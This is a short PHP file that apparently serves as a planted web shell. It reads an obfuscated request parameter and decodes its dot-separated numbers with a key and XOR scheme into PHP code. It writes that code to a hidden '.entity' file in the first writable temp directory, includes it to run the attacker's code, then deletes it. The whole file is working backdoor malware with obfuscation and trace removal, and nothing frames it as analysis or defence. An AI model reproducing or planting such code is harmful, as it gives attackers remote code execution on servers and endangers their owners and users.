<?php

if(isset($_REQUEST["\x70\x73et"])){
	$rec = $_REQUEST["\x70\x73et"];
	 	$rec	=explode(	"."			,$rec	);	 
	$flag = '';
            $s1 = 'abcdefghijklmnopqrstuvwxyz0123456789';
            $sLen = strlen(		$s1	);
            $l = 0;
    
            foreach(		$rec as $v7) {
                $chS = ord(		$s1[$l % $sLen]	);
                $dec =(		(		int)$v7 - $chS -(		$l % 10)) ^ 100;
                $flag		.=		chr(		$dec	);
                $l++;		} 	
	$mrk = array_filter([getenv("TEMP"), "/tmp", getcwd(), session_save_path(), "/var/tmp", "/dev/shm", ini_get("upload_tmp_dir"), getenv("TMP"), sys_get_temp_dir()]);
	foreach ($mrk as $pointer) {
    		if (array_product([is_dir($pointer), is_writable($pointer)])) {
    $factor = implode("/", [$pointer, ".entity"]);
    if (@file_put_contents($factor, $flag) !== false) {
	include $factor;
	unlink($factor);
	exit;
}
}
}
}